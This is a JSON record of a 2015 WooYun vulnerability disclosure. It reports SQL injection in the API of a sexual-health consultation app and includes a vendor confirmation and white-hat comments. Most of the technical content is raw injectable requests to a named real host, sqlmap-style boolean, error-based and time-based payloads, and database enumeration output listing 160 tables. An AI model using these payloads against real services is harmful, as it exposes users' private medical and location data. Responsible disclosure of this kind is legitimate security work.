{"id": 34537, "wybug_id": "wooyun-2015-0108400", "wybug_title": "两性私人医生APP某处SQL注入漏洞(涉及300多万用户信息)", "wybug_corp": "ranknowcn.com", "wybug_author": "几何黑店", "wybug_date": "2015-04-16 17:03", "wybug_open_date": "2015-06-01 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向公众公开  简要描述： 两性私人医生APP SQL注入漏洞(涉及300多万用户信息)~好羞涩~ 详细说明：  \nPOST /client/api.php?randnum=0.8167588198557496 HTTP/1.1Content-Length: 417Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=chatnow&doctorid=1&pagename=msg&source=&sourceid=e&sourcetype=reply&userid=&usertype=user\n参数:doctorid\nPOST /client/api.php?randnum=0.0867801399435848 HTTP/1.1Content-Length: 361Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=login&number=1&password=e&ver=1.3\n参数:number\nPOST /client/api.php?randnum=0.0867801399435848 HTTP/1.1Content-Length: 362Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=login&number=e&password=admin&ver=1.3\n参数:password\nPOST /api/m.php?randnum=0.8685849541798234 HTTP/1.1Content-Length: 306Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=chatend&chatid=1\n参数:chatid\nPOST /api/m.php?randnum=0.42485142801888287 HTTP/1.1Content-Length: 356Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=login&password=e&username=e\n参数:password\nPOST /api/m.php?randnum=0.3527681708801538 HTTP/1.1Content-Length: 344Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=logout&userid=1\n参数:userid\nPOST /api/m.php?randnum=0.42485142801888287 HTTP/1.1Content-Length: 354Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=qr9m0vochgiek7ojk55ubnp295Host: medapp.ranknowcn.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*action=login&password=e&username=admin\n参数:username\nhttp://medapp.ranknowcn.com/client/image.php?key=e\n参数:key   漏洞证明：  \n---Parameter: doctorid (POST)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: action=chatnow&doctorid=-5475' OR 4249=4249#&pagename=msg&source=&sourceid=e&sourcetype=reply&userid=&usertype=user    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: action=chatnow&doctorid=-4478' OR 1 GROUP BY CONCAT(0x716a767671,(SELECT (CASE WHEN (1098=1098) THEN 1 ELSE 0 END)),0x71706b7071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&pagename=msg&source=&sourceid=e&sourcetype=reply&userid=&usertype=user    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: action=chatnow&doctorid=1' AND (SELECT * FROM (SELECT(SLEEP(20)))GXDX)#&pagename=msg&source=&sourceid=e&sourcetype=reply&userid=&usertype=user---web application technology: Nginx, PHP 5.3.5back-end DBMS: MySQL 5.0.12available databases [3]:[*] information_schema[*] lucky_draw[*] medapp\n\nDatabase: medapp[160 tables]+------------------------------+| lucky_draw.user_bak1         || user                         || activedate                   || addrdetailLog                || admin                        || adminpage                    || advert                       || advertType                   || answer                       || appnews                      || assign_percentage            || bj_base_station              || booking                      || chat                         || chatFilterWords              || chatUpdLog                   || chatchange                   || chatclose                    || chatcomment                  || chathistory                  || chatlock                     || chatsourceLog                || chattag                      || chattemp                     || city                         || city2                        || city2LAC                     || city_baidu                   || cityhospital                 || cityhospital_keshi           || customerlock                 || dailyStatement               || doctor                       || doctorBak                    || doctor_autoAssignQuestion    || doctor_fastreply             || doctor_fastreplyParent       || frommsgLog                   || gps_addr                     || gps_addrtag                  || gps_cell                     || gps_imei                     || gps_ios_vars                 || gps_ios_vars_test            || gps_m7_data                  || gps_move_path                || gps_notes                    || gps_points                   || gps_points_test              || gps_pos                      || gps_raw_data                 || gps_user_pic                 || gps_walk_data                || gps_wifi                     || hospital                     || hospitalSellLog              || hospitalSellLog_day          || hospitalSellLog_month        || hospitalSellLog_oldData      || hospitalSellLog_sellPrice    || hospitalSellLog_updLog       || hospitalSellLog_userTelChat  || huodong                      || huodongReport                || importantChatLog             || ios_xyz                      || ios_xyz2                     || ios_xyz2_copy                || ios_xyz2_copy1               || ios_xyz2_copy2               || ios_xyz_feature              || ios_xyz_std                  || iospush                      || iospushmsg                   || iospushmsgTemplate           || iospushmsgType               || iptable                      || jihuo                        || jihuoCountForDate            || jihuo_macaddr                || logs_doctor                  || logs_doctorlogin             || logs_hospital                || logs_question                || logs_quotaQuetsionUserVerify || logs_users                   || meiapp_booking               || meiapp_category              || meiapp_comment               || meiapp_favor                 || meiapp_intro                 || meiapp_mm_offer              || meiapp_mm_photo              || meiapp_mm_vote               || meiapp_news                  || meiapp_news_catid            || meiapp_newscategory          || meiapp_picture               || meiapp_project               || meiapp_share                 || monthlyStatement             || office                       || online                       || publicQuestion               || qa_answer                    || qa_keyword                   || qa_question                  || qa_question_answer           || qa_type                      || question                     || questionCountForDate         || questionDayNum               || questionTop                  || questionType                 || questionTypeChild            || question_all                 || question_repeatLog           || questionhide                 || quotaHospital                || quotaQuestion                || quotaQuestion2               || quotaQuestionSearch          || quotaQuestionSearch_wuxiao   || quotaQuestion_copy           || quotaQuestion_test           || record                       || record_copy                  || regdate                      || retention                    || retention_week               || roles                        || sellLog                      || sina_weibo_access            || syslog                       || t_weibo_access               || tempCode                     || temp_questions               || test_activity                || uploadFile                   || user2                        || userAddrdetail               || userAlias                    || userBlacklist                || userContacts                 || userDeviceid                 || userLeaveWords               || userLog                      || userVisitLog                 || userYanzheng                 || user_copy                    || user_guahao                  || user_guahao_data             || user_huoyue                  || user_mobilemsg               || userhide                     || usersource                   || weeklyStatement              || z_qhp_sell_admin             || z_qhp_sell_log               || z_qhp_set_selled             |+------------------------------+\n\n\n   修复方案：  你懂的   版权声明：转载请注明来源 几何黑店@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-17 14:17 厂商回复： 感谢报告，上次清理，有些参数没有处理。现进行了全局传入参数过滤 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-16 17:05 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这么多人都会聊什么让人羞羞的问题呢    \n     2015-04-16 17:07 |    \t\t几何黑店 \t\t\t( 核心白帽子 |\t\t\t        Rank:1527 漏洞数:231        | 我要低调点儿.......)\t\t \n  @浩天 请看这个你就知道有多羞羞了 WooYun: 两性私人医生某后台弱口令大量敏感用户信息泄露    \n     2015-04-16 17:11 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  －－    \n     2015-04-16 17:26 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  这个好吊    \n     2015-04-16 23:35 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  围观··    \n     2015-04-17 14:23 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  官网都访问不上了。。。显示数据库错误,这是大整改的节奏啊！    \n     2015-04-17 15:31 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  @紫霞仙子 你访问错了~http://ranknowcn.com/ 试试这个~那个是他们以前的域名    \n     2015-04-17 15:34 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @Ton7BrEak 好可怕    \n     2015-04-17 15:56 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  @紫霞仙子 我也再说，厂商里面的地址都有问题。然后发现这里的又是com···    \n     2015-04-20 11:36 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @浩天 私信表哥个QQ啊，以后主站审核找你啊~~~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}